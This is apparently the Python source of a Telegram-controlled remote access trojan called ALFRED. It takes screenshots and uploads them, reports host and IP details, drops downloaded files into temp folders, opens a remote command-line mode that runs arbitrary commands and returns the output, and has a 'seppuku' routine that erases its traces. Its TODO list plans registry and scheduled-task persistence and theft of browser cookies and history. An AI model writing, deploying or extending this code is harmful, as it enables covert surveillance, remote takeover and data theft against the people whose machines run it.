import requests
import os
import sys
import tempfile
import socket
import platform
import subprocess
from PIL import ImageGrab
from t_misc import *


'''
* ORDERS *

- Exit: close the program.
- Status: obtain the host status.
- Reload: restart the program.
- Seppuku: close and delete every trace of itself.
- Help: shows available orders.
- ScreenshotPIL (sspil): get screenshot using PIL.
- ScreenshotPS (ssps): get screenshot using powershell.
- Download file (dofi): send a file to the client and it will save it in the target machine.
- Command-line (cmdline): enter a command-line mode.


* TODO *
- Registry as persistence: execute as admin.
- Change seppuku logic to the following:
	# Remove registry key.
	# copy batch and vbs to external folder.
	# add scheduler task as admin to execute batch at start.
	# force restart pc.
- web browser info stealing (history, bookmarks, cookies, etc.).
- ¿Create user telegram explicitly for this bot?.
'''


class ALFRED(object):

	def __init__(self):
		self.orders = ("exit", "status", "reload", "seppuku", "help", "sspil", "ssps", "dofi", "cmdline")
		self.received_order = None
		self.api = None


	def Handler(self):
		if self.received_order in self.orders:
			#print("Executing '%s' order..." % self.received_order)
			if self.received_order == "exit":
				self.Exit()
			elif self.received_order == "status":
				self.Status()
			elif self.received_order == "reload":
				self.Reload()
			elif self.received_order == "seppuku":
				self.api.SendMessage("Farewell comrade.")
				self.Seppuku()
			elif self.received_order == "help":
				self.Help()
			elif self.received_order == "sspil":
				self.ScreenshotPIL()
			elif self.received_order == "ssps":
				self.ScreenshotPowerShell()
			elif self.received_order == "dofi":
				self.DownloadFile()
			elif self.received_order == "cmdline":
				self.CommandLine()
		else:
			self.api.SendMessage(("Order '" + self.received_order + "' not supported!"))


	def Help(self):
		text = "Available orders are:\n" + ("\n".join(map(str,self.orders)))
		self.api.SendMessage(text)


	def Exit(self):
		self.api.SendMessage("Exiting now, see ya later!")
		sys.exit()


	def Status(self):
		hostname = socket.gethostname()
		localip = socket.gethostbyname(hostname)
		externalip = requests.get('https://api.ipify.org').text
		operatingsystem = platform.platform()
		text = "Operating system= " + operatingsystem + "\nHostname=" + hostname + "\nLocal IP=" + localip + "\nExternal IP=" + externalip + "\nSystem time=" + GetTime() + "\nSystem date=" + GetDate()
		self.api.SendMessage(text)


	def ScreenshotPIL(self):
		filename = RandomName() + ".jpg"
		usertemp = tempfile.gettempdir()
		windowstemp = "C:\\Windows\\Temp"
		
		if os.path.exists(usertemp):
			path = (usertemp+"\\"+filename)
			ImageGrab.grab().save(path)
			self.api.SendPhoto(path)
			os.remove(path)
		elif os.path.exists(windowstemp):
			path = (windowstemp+"\\"+filename)
			ImageGrab.grab().save(path)
			self.api.SendPhoto(path)
			os.remove(path)
		else:
			self.api.SendMessage("Temporal directories not found!")


	def ScreenshotPowerShell(self):
		command = ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -file C:\\Windows\\TEA\\t_ssps.ps1 -executionpolicy unrestricted".strip()).split(" ")
		process = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

		if process.stdout:
			filepath = process.stdout.decode("ansi").replace("\n", "")
		elif process.stderr:
			filepath = process.stderr.decode("ansi").replace("\n", "")
		else:
			self.api.SendMessage("Powershell exited with no output.")
			return False
		
		if os.path.exists(filepath):
			self.api.SendPhoto(filepath)
			os.remove(filepath)
		else:
			self.api.SendMessage(("Screenshot file not found or not created: " + filepath))


	def Reload(self):
		self.api.SendMessage("Attempting reload, hold on...")
		os.system("start s_order_66.bat") # When compiling put here the FULL PATH where the bat file will be.
		#os.system("wscript s_silent.vbs s_order_66.bat")
		sys.exit()


	def DownloadFile(self):
		self.api.SendMessage("Waiting for file...")
		seconds = 0
		document = self.api.WaitForUpdate("document")
		file_path = self.api.GetFile(document["file_id"])
		url = "https://api.telegram.org/file/bot" + self.api.token + "/" + file_path

		file_extension = file_path.split("/")[1].split(".")
		file_extension = file_extension[len(file_extension)-1]
		file_name = RandomName() + "." + file_extension

		usertemp = tempfile.gettempdir()
		windowstemp = "C:\\Windows\\Temp"
		
		if os.path.exists(usertemp):
			path = (usertemp+"\\"+file_name)
			req = self.api.GetRequest(url)
			open(path, 'wb').write(req.content)
			self.api.SendMessage(("File saved in " + path + "."))
			return path
		elif os.path.exists(windowstemp):
			path = (windowstemp+"\\"+file_name)
			req = self.api.GetRequest(url)
			open(path, 'wb').write(req.content)
			self.api.SendMessage(("File saved in " + path + "."))
			return path
		else:
			self.api.SendMessage("Temporal directories not found. Could not download file.")
			return False


	def CommandLine(self):
		self.api.SendMessage("Entered command line! \nWrite 'water' to exit it at any time.")

		while True:
			command = self.api.WaitForUpdate()
			
			if command == "water":
				self.api.SendMessage("Command line closed.")
				break
			elif command:
				command = (command.strip()).split(" ")
				process = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
				if process.returncode == 0:
					if process.stdout:
						self.api.SendMessage(process.stdout.decode("ansi"))
					elif process.stderr:
						self.api.SendMessage(process.stderr.decode("ansi"))
					else:
						self.api.SendMessage("Command got no output.")
				else:
					self.api.SendMessage("Command not recognized or not supported.")
			else:
				self.api.SendMessage("Wrong command, maybe sent an empty one?")


	def Seppuku(self):		
		# clean all traces
		os.system("start s_seppuku.bat") # When compiling put here the FULL PATH where the bat file will be.
		#os.system("wscript s_silent.vbs s_seppuku.bat")
		sys.exit()